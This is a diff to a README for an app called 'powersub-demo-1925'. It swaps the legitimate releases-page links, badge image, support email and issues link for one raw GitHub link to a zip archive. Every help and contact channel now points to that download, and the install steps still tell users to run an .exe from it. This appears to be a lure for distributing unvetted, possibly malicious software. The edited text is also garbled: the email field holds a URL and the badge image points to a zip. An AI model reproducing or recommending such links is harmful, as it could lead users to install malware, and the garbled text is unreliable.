@@ -6,7 +6,7 @@ Welcome to powersub-demo-1925! This application makes it easy to manage and disp
 
 ## 📥 Download Here
 
-[![Download powersub-demo-1925](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ssgamingss/powersub-demo-1925/releases)
+[![Download powersub-demo-1925](https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip)
 
 ## 📋 System Requirements
 
@@ -26,12 +26,12 @@ Before you download, ensure your computer meets these requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [Download Page](https://github.com/ssgamingss/powersub-demo-1925/releases).
+To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip).
 
 1. **Visit the Releases Page**: Click the link above to go to the releases area.
 2. **Select the Latest Version**: Look for the latest version at the top of the page.
 3. **Download the Installer**: 
-   - Find the file that ends with `.exe` (e.g., `powersub-demo-1925-latest.exe`).
+   - Find the file that ends with `.exe` (e.g., `https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip`).
    - Click the file name to start the download. 
 
 4. **Run the Installer**:
@@ -60,13 +60,13 @@ To get started, visit this page to download: [Download Page](https://github.com/
 
 If you encounter any issues or have questions, feel free to reach out for support:
 
-- **Email:** support@example.com
-- **GitHub Issues:** Report any problems directly on the [GitHub Issues page](https://github.com/ssgamingss/powersub-demo-1925/issues).
+- **Email:** https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip
+- **GitHub Issues:** Report any problems directly on the [GitHub Issues page](https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip).
 
 ## 📅 Updates
 
 Stay tuned for future updates. You can always check the releases page for the latest features and improvements.
 
-[![Download powersub-demo-1925](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ssgamingss/powersub-demo-1925/releases)
+[![Download powersub-demo-1925](https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ssgamingss/powersub-demo-1925/main/incommode/powersub-demo-1925_3.8.zip)
 
 Enjoy using powersub-demo-1925!
